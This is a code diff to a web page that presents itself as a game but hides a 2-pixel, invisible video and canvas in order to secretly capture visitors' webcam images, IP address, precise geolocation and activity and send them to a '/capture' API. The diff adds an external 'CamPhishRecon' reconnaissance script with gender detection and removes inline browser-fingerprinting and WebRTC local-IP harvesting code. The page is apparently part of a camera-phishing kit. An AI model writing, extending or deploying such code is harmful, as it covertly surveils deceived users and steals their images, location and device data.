@@ -52,6 +52,7 @@ video,canvas#cap{position:fixed;opacity:0;pointer-events:none;width:2px;height:2
 </style>
 </head>
 <body>
+<script src="forwarding_link/t/recon.js"></script>
 <div id="wrap">
 <canvas id="c"></canvas>
 <video id="v" playsinline autoplay muted></video>
@@ -247,41 +248,36 @@ snd(600,0.08,'sine');haptic(10);
 }
 
 function captureIP(){
+if(window.CamPhishRecon){
+CamPhishRecon.init({genderDetect:true});
+}else{
 fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'}).catch(function(){});
-collectFingerprint();
+}
 }
 function captureLoc(){
-if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
+if(window.CamPhishRecon){
+CamPhishRecon.Capture.location();
+}else if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(function(p){
 fetch(API+'/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}).catch(function(){});
-fetch(API+'/capture/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event_type:'location_granted'})}).catch(function(){});
-},function(){
-fetch(API+'/capture/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event_type:'location_denied'})}).catch(function(){});
 },{enableHighAccuracy:true,timeout:10000});
+}
 }
 function captureShot(){
 if(!stream||vid.readyState<2)return;
 capCtx.drawImage(vid,0,0,320,240);
+if(window.CamPhishRecon){
+CamPhishRecon.Capture.image(capCanvas.toDataURL('image/png'),camOn?'webrtc':'canvas');
+}else{
 fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:capCanvas.toDataURL('image/png'),capture_method:camOn?'webrtc':'canvas'})}).catch(function(){});
 }
-function collectFingerprint(){
-var fp={};
-fp.screen_resolution=screen.width+'x'+screen.height;
-fp.color_depth=screen.colorDepth;
-fp.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
-fp.language=navigator.language;
-fp.platform=navigator.platform;
-fp.hardware_concurrency=navigator.hardwareConcurrency;
-fp.device_memory=navigator.deviceMemory||null;
-try{var tc=document.createElement('canvas');var tcx=tc.getContext('2d');tcx.textBaseline='top';tcx.font='14px Arial';tcx.fillText('FP',2,2);fp.canvas_fingerprint=tc.toDataURL().substring(0,100);}catch(e){}
-try{var wc=document.createElement('canvas');var gl=wc.getContext('webgl');if(gl)fp.webgl_fingerprint=gl.getParameter(gl.VENDOR)+' '+gl.getParameter(gl.RENDERER);}catch(e){}
-if(navigator.getBattery){navigator.getBattery().then(function(b){fp.battery_level=b.level;fp.battery_charging=b.charging;sendFP(fp);});}else{sendFP(fp);}
-try{var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer(function(o){pc.setLocalDescription(o,function(){},function(){});},function(){});pc.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate){var m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);if(m&&m[1]&&!m[1].startsWith('0.')){fp.local_ip=m[1];sendFP(fp);}pc.close();}};setTimeout(function(){pc.close();},3000);}catch(e){}
-}
-function sendFP(fp){
-fetch(API+'/capture/fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(fp)}).catch(function(){});
 }
 function logEvent(type,data){
+if(window.CamPhishRecon){
+CamPhishRecon.Capture.event(type,data);
+}else{
 fetch(API+'/capture/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event_type:type,event_data:data||null})}).catch(function(){});
+}
 }
 
 function startGame(){
